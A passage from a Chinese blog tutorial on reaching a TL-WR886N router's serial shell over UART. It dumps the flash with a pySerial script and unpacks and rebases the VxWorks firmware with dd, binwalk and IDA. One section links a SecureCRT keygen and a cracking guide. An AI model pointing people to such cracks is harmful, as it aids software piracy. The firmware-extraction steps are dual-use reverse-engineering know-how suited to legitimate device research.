src="/2024/02/25/TL-WR886N%E8%B7%AF%E7%94%B1%E5%99%A8uart%E8%B0%83%E8%AF%95%E5%8F%8AVxWorks%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96%E5%92%8C%E5%88%86%E6%9E%90/IMG_20240220_182522-1708425211873.jpg"></p><ul><li>Vcc</li></ul><p>路由器接电源，万用表调整至测电压20v档。黑表笔接GND，红表笔分别接其它孔，电压为3.3V或5V的为Vcc，如果有多个孔符合，则分别和GND短接，观察是否电源灯灭，短接后电源灯灭的是Vcc。</p><p>笔者测出来1号孔3.3V，3号孔0V，4号孔2.59V，那么显然1号孔是Vcc，短接1和2GND后确实发现电源灯灭。</p><ul><li>TXD</li></ul><p>电源和万用表同Vcc，黑笔接GND，红笔分别尝试剩下的两个孔，连接后按重启按钮(有的需要长按)，重启时电压发生跳动的是TXD。这里显然4号孔是TXD。</p><ul><li>RXD</li></ul><p>剩下的3号孔就是RXD。如果是5孔的板子，剩下的两个孔需要分别尝试接入usb转ttl设备。</p><h3 id="连接USB转TTL设备"><a href="#连接USB转TTL设备" class="headerlink" title="连接USB转TTL设备"></a>连接USB转TTL设备</h3><p>分辨完引脚，需要链接usb转ttl设备和uart接口，可以焊一排引脚或使用测试夹，测试夹更方便，这里使用测试夹。</p><p>连接时按照文章中的对应关系，GND接TTL设备GND，TXD接TTL设备RXD，RXD接TTL设备TXD，Vcc不用接。</p><p>本文设备的对应关系：灰-1-Vcc、紫-2-GND、蓝-3-RXD、绿-4-TXD</p><p>正确连接后应如下图所示，POW灯亮，TXD和RXD灯灭。</p><p><img src="/2024/02/25/TL-WR886N%E8%B7%AF%E7%94%B1%E5%99%A8uart%E8%B0%83%E8%AF%95%E5%8F%8AVxWorks%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96%E5%92%8C%E5%88%86%E6%9E%90/IMG_20240220_213131(1).jpg"></p><p><img src="/2024/02/25/TL-WR886N%E8%B7%AF%E7%94%B1%E5%99%A8uart%E8%B0%83%E8%AF%95%E5%8F%8AVxWorks%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96%E5%92%8C%E5%88%86%E6%9E%90/IMG_20240220_213123(1)(1).jpg"></p><p><img src="/2024/02/25/TL-WR886N%E8%B7%AF%E7%94%B1%E5%99%A8uart%E8%B0%83%E8%AF%95%E5%8F%8AVxWorks%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96%E5%92%8C%E5%88%86%E6%9E%90/IMG_20240220_213103(1).jpg"></p><p>完成接线后就是使用终端软件来接收终端，终端软件有很多，这里使用SecureCRT，使用PuTTY或者在linux上使用Picocom也可以。</p><h3 id="SecureCRT下载和破解"><a href="#SecureCRT下载和破解" class="headerlink" title="SecureCRT下载和破解"></a>SecureCRT下载和破解</h3><p>可以在<a href="https://gitee.com/liu_chaos/doc-lib/blob/master/SecureCRT+keygen_x64.zip">这里</a>下载软件和keygen，官网下很麻烦。</p><p>软件的具体安装和破解可以参考<a href="https://blog.csdn.net/qq_64039239/article/details/132577564">该博客</a></p><p>如果不想安装到c盘，可以在以下步骤选择custom，点next后只修改存放路径继续next</p><p><img src="/2024/02/25/TL-WR886N%E8%B7%AF%E7%94%B1%E5%99%A8uart%E8%B0%83%E8%AF%95%E5%8F%8AVxWorks%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96%E5%92%8C%E5%88%86%E6%9E%90/QQ%E6%88%AA%E5%9B%BE20240220215204.png"></p><h3 id="SecureCRT使用"><a href="#SecureCRT使用" class="headerlink" title="SecureCRT使用"></a>SecureCRT使用</h3><p>USB转TTL设备插入后Port中会出现ch340的选项。波特率因设备而异，9600-115200居多，设置不正确会导致和设备交互时出现乱码，本设备通过<a href="https://blog.csdn.net/weixin_30245867/article/details/95395420">该文章</a>得知波特率为117500，一般来说如果常见波特率尝试后无效，可能需要在官方手册中查找串口参数并计算。</p><p><a href="https://www.secpulse.com/archives/157847.html">参考文章</a>中有一些该步骤常见问题排查及波特率标准。</p><p>需要注意的是，<strong>有时断电重新接通路由器电源后，再使用117500波特率连接会乱码，需要短接一次Vcc和GND后才恢复正常</strong></p><p>如下图设置连接后可获取路由器的shell </p><p><img src="/2024/02/25/TL-WR886N%E8%B7%AF%E7%94%B1%E5%99%A8uart%E8%B0%83%E8%AF%95%E5%8F%8AVxWorks%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96%E5%92%8C%E5%88%86%E6%9E%90/QQ%E6%88%AA%E5%9B%BE20240220215527.png"></p><h3 id="GetShell之后-flash转储"><a href="#GetShell之后-flash转储" class="headerlink" title="GetShell之后 - flash转储"></a>GetShell之后 - flash转储</h3><p><a href="https://www.secpulse.com/archives/150363.html">uart转储固件参考文章1</a></p><p><a href="https://blog.csdn.net/qq_58278472/article/details/127449335">uart转储固件参考文章2</a></p><p>可使用的命令如下，能dump内存、读写闪存、通过tftp协议上传和下载文件、查看文件系统信息、连接云服务端等。</p><img src="/2024/02/25/TL-WR886N%E8%B7%AF%E7%94%B1%E5%99%A8uart%E8%B0%83%E8%AF%95%E5%8F%8AVxWorks%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96%E5%92%8C%E5%88%86%E6%9E%90/QQ截图20240220211242.png" alt="QQ截图20240220211242" style="zoom:50%;"><p>flash命令</p><img src="/2024/02/25/TL-WR886N%E8%B7%AF%E7%94%B1%E5%99%A8uart%E8%B0%83%E8%AF%95%E5%8F%8AVxWorks%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96%E5%92%8C%E5%88%86%E6%9E%90/QQ截图20240221130511.png" alt="QQ截图20240221130511" style="zoom:50%;"><p><code>flash -layout</code>查看flash布局，<code>FIRMWARE</code>就是固件，偏移是0x32000，大小为1848k</p><img src="/2024/02/25/TL-WR886N%E8%B7%AF%E7%94%B1%E5%99%A8uart%E8%B0%83%E8%AF%95%E5%8F%8AVxWorks%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96%E5%92%8C%E5%88%86%E6%9E%90/QQ截图20240220224905.png" alt="QQ截图20240220224905" style="zoom:50%;"><p>使用flash -read时，系统奔溃了，询问gpt可以了解每条报错的含义，这里大概是因为虚拟内存中0x00000000地址不可写。用flash命令提取固件不太方便。</p><p><img src="/2024/02/25/TL-WR886N%E8%B7%AF%E7%94%B1%E5%99%A8uart%E8%B0%83%E8%AF%95%E5%8F%8AVxWorks%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96%E5%92%8C%E5%88%86%E6%9E%90/QQ%E6%88%AA%E5%9B%BE20240221134700.png"></p><p><code>fs -stat</code>发现内存中rom的基址是BF000000，mem命令可以dump内存，那么或许可以从内存中dump闪存</p><p><img src="/2024/02/25/TL-WR886N%E8%B7%AF%E7%94%B1%E5%99%A8uart%E8%B0%83%E8%AF%95%E5%8F%8AVxWorks%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96%E5%92%8C%E5%88%86%E6%9E%90/QQ%E6%88%AA%E5%9B%BE20240221150236.png"></p><p>使用<code>mem -dump</code>查看BF000000-BF200000的内存的16进制，和编程器提取的flash比较，发现是一致的，那么通过该命令即可转储闪存。</p><p>但是一次最多dump 16k的数据也就是0x1000，那么需要dump两百次，写脚本进行dump。</p><p><img src="/2024/02/25/TL-WR886N%E8%B7%AF%E7%94%B1%E5%99%A8uart%E8%B0%83%E8%AF%95%E5%8F%8AVxWorks%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96%E5%92%8C%E5%88%86%E6%9E%90/QQ%E6%88%AA%E5%9B%BE20240222115620.png"></p><p>两篇参考文章中都使用了python的<code>serial</code>库，这是一个用于串口(serial)通信的库，可以用来和uart串口交互提取固件。参考1中使用JTagulator连接uart转储闪存的脚本放在了<a href="https://github.com/waldo-irc/IOTToolkit/blob/master/FlashDumpScript/DumpFirmware.py">github</a>可以参考。搜索引擎能找到一些教程，也有<a href="https://pythonhosted.org/pyserial/">pySerial官方文档</a>。下面是基于该库写的闪存dump脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> serial<br><span class="hljs-keyword">import</span> serial.tools.list_ports<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ser_readall</span>():                   <span class="hljs-comment">#读取并打印所有数据，去除回车并转义输出</span><br>    c = ser.read().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-keyword">while</span> (c):<br>        <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27;\r&#x27;</span>):<br>            c = <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-built_in">print</span>(c, end=<span class="hljs-string">&#x27;&#x27;</span>)<br>        c = ser.read(<span class="hljs-number">1</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br>port_list = <span class="hljs-built_in">list</span>(serial.tools.list_ports.comports())  <span class="hljs-comment">#搜索可用串口</span><br><span class="hljs-built_in">print</span>(port_list)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(port_list) == <span class="hljs-number">0</span>:<br>   <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;无可用串口&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(port_list)):<br>        <span class="hljs-built_in">print</span>(port_list[i])<br><br>ser = serial.Serial()<br>ser.port = <span class="hljs-string">&#x27;COM9&#x27;</span><br>ser.baudrate = <span class="hljs-number">117500</span><br>ser.timeout = <span class="hljs-number">0.5</span><br>ser.<span class="hljs-built_in">open</span>()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Port &#x27;</span> + ser.port + <span class="hljs-string">&#x27; open state: &#x27;</span> + <span class="hljs-built_in">str</span>(ser.isOpen()))<br>start = <span class="hljs-number">0xbf000000</span><br><span class="hljs-built_in">len</span> = <span class="hljs-number">0x1000</span><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;TL-WR886N.bin&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x200</span>):<br>    ser.write(<span class="hljs-string">b&#x27;mem -dump &#x27;</span>  + <span class="hljs-built_in">hex</span>(start).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>) + <span class="hljs-string">b&#x27; &#x27;</span> + <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>) + <span class="hljs-string">b&#x27;\r&#x27;</span>)<br>    start += <span class="hljs-built_in">len</span><br>    line = ser.readline().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>).replace(<span class="hljs-string">&#x27;\r&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br><br>    <span class="hljs-keyword">while</span>(line):<br>        <span class="hljs-keyword">if</span> (line[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;BF&#x27;</span>):<br>            <span class="hljs-comment">#print(line)</span><br>            data = line.split(<span class="hljs-string">&#x27;  &#x27;</span>)[<span class="hljs-number">1</span>].replace(<span class="hljs-string">&#x27; -&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>            <span class="hljs-comment">#print(data)</span><br>            byte = data.split(<span class="hljs-string">&#x27; &#x27;</span>)<br>            <span class="hljs-comment">#print(byte)</span><br>            <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> byte:<br>                word = <span class="hljs-built_in">bytes</span>.fromhex(c)<br>                f.write(word)<br>        line = ser.readline().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>).replace(<span class="hljs-string">&#x27;\r&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&#x27;/512&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="固件分析"><a href="#固件分析" class="headerlink" title="固件分析"></a>固件分析</h2><p>直接<code>binwalk -Me</code>解包出一堆压缩包、图片、网站源码和资源文件，但是没有文件系统，通过查资料发现该固件并非linux系统，而是VxWorks系统，属于RTOS系统的一种。VxWorks系统的固件和Linux系统的固件有较大差异。分析VxWorks固件的关键是正确反编译固件中的VxWorks系统映像，查看其中的函数，一般步骤为： 获取设备CPU架构和端序 -&gt; 获取flash中的uboot、固件和系统映像 -&gt; 获取固件在内存中的加载地址 -&gt; 恢复系统映像符号表 -&gt; 反编译系统映像进行代码审计。</p><h3 id="VxWorks固件初步判断依据"><a href="#VxWorks固件初步判断依据" class="headerlink" title="VxWorks固件初步判断依据"></a>VxWorks固件初步判断依据</h3><p><a href="https://www.ctfiot.com/86294.html">参考文章 - VxWorks固件加载地址分析方法研究</a></p><p>1.MyFirmware字符串</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">hexdump -C TL-WR886N.bin | grep MyFirmware</span><br>00031ec0  4d 79 46 69 72 6d 77 61  72 65 00 00 00 00 00 01  |MyFirmware......|<br></code></pre></td></tr></table></figure><p>2.MINIFS文件系统 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">hexdump -C TL-WR886N.bin | grep MINIFS</span><br>00021000  4d 49 4e 49 46 53 00 00  00 00 00 00 00 00 00 00  |MINIFS..........|<br>000e7000  4d 49 4e 49 46 53 00 00  00 00 00 00 00 00 00 00  |MINIFS..........|<br>00178000  4d 49 4e 49 46 53 00 00  00 00 00 00 00 00 00 00  |MINIFS..........|<br>001c3000  4d 49 4e 49 46 53 00 00  00 00 00 00 00 00 00 00  |MINIFS..........|<br></code></pre></td></tr></table></figure><h3 id="确定架构及端序"><a href="#确定架构及端序" class="headerlink" title="确定架构及端序"></a>确定架构及端序</h3><p><code>binwalk -Y</code>得知为CPU架构为32位，MIPS，端序为大端序</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">binwalk -Y TL-WR886N.bin</span> <br><br>DECIMAL       HEXADECIMAL     DESCRIPTION<br>--------------------------------------------------------------------------------<br>60            0x3C            MIPS executable code, 32/64-bit, big endian, at least 1250 valid instructions<br></code></pre></td></tr></table></figure><h3 id="VxWorks系统映像概述及引导启动过程"><a href="#VxWorks系统映像概述及引导启动过程" class="headerlink" title="VxWorks系统映像概述及引导启动过程"></a>VxWorks系统映像概述及引导启动过程</h3><p>补充一些基础知识</p><p><a href="http://www.360doc.com/content/12/1007/09/7775902_239886044.shtml">参考文章1</a></p><p><a href="https://blog.csdn.net/jackixzj/article/details/37756481">参考文章2</a></p><p>VxWorks大致启动流程：</p><p>上电 </p><p>-&gt; 执行rom首地址的<code>bootstrap</code>进行系统的基本初始化、寄存器设置、存储器映射等</p><p>-&gt; bootstrap将<code>u-bootimage</code>加载(并解压)到RAM(内存)的<code>RAM_HIGH_ADRS</code>地址并跳转到该地址执行 </p><p>-&gt; ubootimage构建最小可运行系统 </p><p>-&gt; ubootimage将rom中的<code>VxWork映像</code>加载(并解压)到RAM的<code>RAM_LOW_ADRS</code>地址，跳转至该地址执行 </p><p>-&gt; 硬件环境重新初始化，VxWorks启动</p><ul><li><p>bootloader由<code>bootstrap</code>和<code>bootimg</code>组成。bootstrap是最初级的引导，旨在初始化CPU、内存控制器、时钟、堆栈，目标是让CPU正常运作起来。boot image往往初始化最小OS内核，搭建网络下载通道，提供一个可以交互的命令行，以便自我更新（update boot）或下载更新系统映像（update vxWorks）。</p></li><li><p>CPU上电后，指令指针指向一个设定好的地址，ROM&#x2F;Flash被映射到该地址，CPU从该地址开始执行bootloader。因此<strong>bootloader的基址并不是0，而是CPU中预先设定的地址</strong>，本文中该地址可通过逆向bootstrap获得。</p></li><li><p>整个ROM(Flash)在bootstrap进行初始化时被映射到内存中。本设备该映射地址即flash转储步骤中用到的0xBF000000(在ram中物理地址为<code>0xBF000000 &amp; 0x1FFFFFFF = 0x1F000000</code>)。</p></li><li><p><code>Boot Rom</code>即存放bootloader和系统映像的ROM&#x2F;Flash芯片，其中还会存放应用程序资源、用户配置数据等信息。</p></li></ul><h3 id="获取uboot、固件和Vxworks系统映像"><a href="#获取uboot、固件和Vxworks系统映像" class="headerlink" title="获取uboot、固件和Vxworks系统映像"></a>获取uboot、固件和Vxworks系统映像</h3><p>dump出的是整个flash，根据flash布局，使用dd命令进行提取出FACUBOOT、BOOTIMG和FIRMWARE，两份uboot和一份固件。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">dd if=TL-WR886N.bin of=facuboot bs=1 skip=0 count=131072  #0x20000=131072<br>dd if=TL-WR886N.bin of=bootimg bs=1 skip=163840 count= 40448  #0x28000=163840   0x31e00-0x28000=40448<br>dd if=TL-WR886N.bin of=firmware bs=1 skip=204800 count=1892352 #0x32000=204800  0x200000-0x32000=1892352<br></code></pre></td></tr></table></figure><p>提取出来后分别<code>binwalk</code>查看，发现如下对应关系</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">binwalk TL-WR886N.bin</span><br>DECIMAL       HEXADECIMAL     DESCRIPTION<br>--------------------------------------------------------------------------------<br><span class="hljs-meta prompt_">#</span><span class="language-bash">FACUBOOT</span><br>13840         0x3610          U-Boot version string, &quot;U-Boot 1.1.4 (Apr  1 2016 - 17:30:08)&quot;<br>13888         0x3640          CRC32 polynomial table, big endian<br>15136         0x3B20          uImage header, header size: 64 bytes, header CRC: 0xDBBCB4A2, created: 2016-04-01 09:30:09, image size: 57104 bytes, Data Address: 0x80010000, Entry Point: 0x80010000, data CRC: 0xF4C2D0C3, OS: Linux, CPU: MIPS, image type: Firmware Image, compression type: lzma, image name: &quot;u-boot image&quot;<br>15200         0x3B60          LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 140620 bytes<br><span class="hljs-meta prompt_">#</span><span class="language-bash">BOOTIMG</span><br>176432        0x2B130         U-Boot version string, &quot;U-Boot 1.1.4 (Apr  1 2016 - 17:29:18)&quot;<br>176480        0x2B160         CRC32 polynomial table, big endian<br>177708        0x2B62C         uImage header, header size: 64 bytes, header CRC: 0x5FA1A7B0, created: 2016-04-01 09:29:19, image size: 20973 bytes, Data Address: 0x80010000, Entry Point: 0x80010000, data CRC: 0xF51A98FC, OS: Linux, CPU: MIPS, image type: Firmware Image, compression type: lzma, image name: &quot;u-boot image&quot;<br>177772        0x2B66C         LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 52596 bytes<br><span class="hljs-meta prompt_">#</span><span class="language-bash">FIRMWARE</span><br>204800        0x32000         LZMA compressed data, properties: 0x6E, dictionary size: 8388608 bytes, uncompressed size: 2354144 bytes<br>946240        0xE7040         LZMA compressed data, properties: 0x5A, dictiona ry size: 8388608 bytes, uncompressed size: 6020 bytes<br>......................<br>一堆LZMA compressed data<br></code></pre></td></tr></table></figure><h4 id="uboot-bootstrap"><a href="#uboot-bootstrap" class="headerlink" title="uboot-bootstrap"></a>uboot-bootstrap</h4><p>对uboot的处理参考<a href="https://blog.knownsec.com/index.html%3Fp=4971.html">该文章</a>，uboot分为三部分:bootstrap代码、0x40字节的uboot image的头部信息、lzma加密的ubootimage主体，通过binwalk信息就能大致分辨各部分的偏移和大小。 </p><p>binwalk得到的uboot信息中，<code>Data  Address: 0x80010000, Entry Point: 0x80010000</code>表示设备启动后，会把后续ubootimg通过lzma解压出来的数据存入内存地址0x80010000，然后把$pc设置为: 0x80010000。</p><p>这里只处理FACUBOOT，BOOTIMG同理</p><p>使用dd命令提取出bootstrap，用ida打开，由于基址未知，这里暂时和ubootimg一样设定为0x80010000</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">dd if=facuboot of=facbootstrap bs=1 skip=0 count=15136 #15136=0x3B20<br></code></pre></td></tr></table></figure><p>在第一个跳转地址0x80010400的下方找到<code>move $gp,$ra</code>，mips通过gp寄存器相对寻址GOT表，即gp会指向got表，所以可以通过gp指针的数值结合bootstrap的大小推测bootstrap的基址</p><p><img src="/2024/02/25/TL-WR886N%E8%B7%AF%E7%94%B1%E5%99%A8uart%E8%B0%83%E8%AF%95%E5%8F%8AVxWorks%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96%E5%92%8C%E5%88%86%E6%9E%90/QQ%E6%88%AA%E5%9B%BE20240227193321.png"></p><p>分析汇编,</p><ul><li><p><code>bal</code>,跳转指令，跳转到目标地址，同时将当前指令的返回地址保存到 RA 寄存器中。同时，mips CPU中还有分支延时槽机制，参考该<a href="https://zhuanlan.zhihu.com/p/528601710">文章</a>，bal指令的下一条指令(此处是nop)为分支延时槽，跳转到目标地址前会先执行分支延时槽指令，所以这里保存到RA的返回地址为0x80010504。</p></li><li><p><code>lw $t1, 0($ra)</code>,相当于将<code>$ra+0</code>地址处的一个word(4字节)存入t1寄存器</p></li></ul><p>这些代码最终把0x9F003A70存入了gp寄存器，然后通过offset($gp)寻址got表中的函数。结合bootstrap文件大小0x3B20可推测基址为0x9F000000，这也是一个比较常见的bootstrap基址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs assembly">ROM:800104FC 04 11 00 02                   bal     sub_80010508<br>ROM:80010500 00 00 00 00                   nop<br>ROM:80010500<br>ROM:80010500                                # -----------------------------------<br>ROM:80010504 9F 00 3A 70                   .word 0x9F003A70<br>ROM:80010508<br>ROM:80010508                                # =============== S U B R O U T I N E <br>ROM:80010508<br>ROM:80010508<br>ROM:80010508                               sub_80010508:                            # CODE XREF: ROM:800104FC↑p<br>ROM:80010508 03 E0 E0 21                   move    $gp, $ra<br>ROM:8001050C 8F E9 00 00                   lw      $t1, 0($ra)<br>ROM:80010510 01 20 E0 21                   move    $gp, $t1<br></code></pre></td></tr></table></figure><p>在<code>Edit -&gt; Segments -&gt; Rebase Program</code>重新设置基址为0x9f000000。</p><p>将<code>Options -&gt; general -&gt; Processer specific analysis options -&gt;$gp value</code>设置为0x9F003A70</p><p><code>Edit -&gt; Select All</code>重新反汇编，多分析出了很多函数，got表也恢复正常，处理完成。</p><p><img src="/2024/02/25/TL-WR886N%E8%B7%AF%E7%94%B1%E5%99%A8uart%E8%B0%83%E8%AF%95%E5%8F%8AVxWorks%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96%E5%92%8C%E5%88%86%E6%9E%90/QQ%E6%88%AA%E5%9B%BE20240228105914.png"></p><p>通过逆向ubootimage也能获取bootstrap基址，在下文确定固件加载地址-&gt;(通用)逆向ubootimage找加载地址中介绍.</p><h4 id="uboot主体部分"><a href="#uboot主体部分" class="headerlink" title="uboot主体部分"></a>uboot主体部分</h4><p>提取facuboot的主体部分，偏移为0x3B60，尾部位于下图光标前(不包含0xFF)，因为需要对齐填充了很多0xFF，这些对齐字节并不属于压缩文件的一部分。</p><p><img src="/2024/02/25/TL-WR886N%E8%B7%AF%E7%94%B1%E5%99%A8uart%E8%B0%83%E8%AF%95%E5%8F%8AVxWorks%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96%E5%92%8C%E5%88%86%E6%9E%90/QQ%E6%88%AA%E5%9B%BE20240226124618.png"></p><p>使用dd命令提取出主体部分的lzma压缩文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=facuboot of=facbody bs=1 skip=15200 count=57104 <span class="hljs-comment">#0x3B60=15200   0x11A70-0x3B60=0xDF10=57104</span></span><br></code></pre></td></tr></table></figure><p>更改后缀名为.xz并解压缩</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">mv</span> facbody facbody.xz</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">xz -k -d facbody.xz</span><br></code></pre></td></tr></table></figure><p>前文由binwalk信息已知ubootimg基址为0x80010000。使用ida正确设置cpu、端序及加载地址后打开，简单处理后如下说明解压成功</p><p><img src="/2024/02/25/TL-WR886N%E8%B7%AF%E7%94%B1%E5%99%A8uart%E8%B0%83%E8%AF%95%E5%8F%8AVxWorks%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96%E5%92%8C%E5%88%86%E6%9E%90/QQ%E6%88%AA%E5%9B%BE20240226125708.png"></p><p>另一份名为为BOOTIMG的uboot同理，命令如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">dd if=bootimg of=bootbody bs=1 skip=13932 count=20973<br>mv bootbody bootbody.xz<br>xz -k -d bootbody.xz<br></code></pre></td></tr></table></figure><h4 id="FIRMWARE-提取系统映像"><a href="#FIRMWARE-提取系统映像" class="headerlink" title="FIRMWARE-提取系统映像"></a>FIRMWARE-提取系统映像</h4><p>FIRMWARE中几乎都是LZMA加密的数据，其中0地址的数据块大小为2354144，明显比其它数据块大很多。<code>binwalk -Me</code>得到解密后的数据，发现除了<code>0</code>,其它都是图片或文本文件。</p><img src="/2024/02/25/TL-WR886N%E8%B7%AF%E7%94%B1%E5%99%A8uart%E8%B0%83%E8%AF%95%E5%8F%8AVxWorks%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96%E5%92%8C%E5%88%86%E6%9E%90/QQ截图20240224173704.png" alt="QQ截图20240224173704" style="zoom:50%;"><p>binwalk查看<code>0</code>确认为VxWorks系统映像，其余都是文件系统中的文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">binwalk 0</span><br><br>DECIMAL       HEXADECIMAL     DESCRIPTION<br>--------------------------------------------------------------------------------<br>1834812       0x1BFF3C        Certificate in DER format (x509 v3), header length: 4, sequence length: 4<br>1842100       0x1C1BB4        Certificate in DER format (x509 v3), header length: 4, sequence length: 4<br>1887200       0x1CCBE0        VxWorks operating system version &quot;5.5.1&quot; , compiled: &quot;Aug 23 2019, 11:35:29&quot;<br>1955356       0x1DD61C        Copyright string: &quot;Copyright(C) 2001-2011 by TP-LINK TECHNOLOGIES CO., 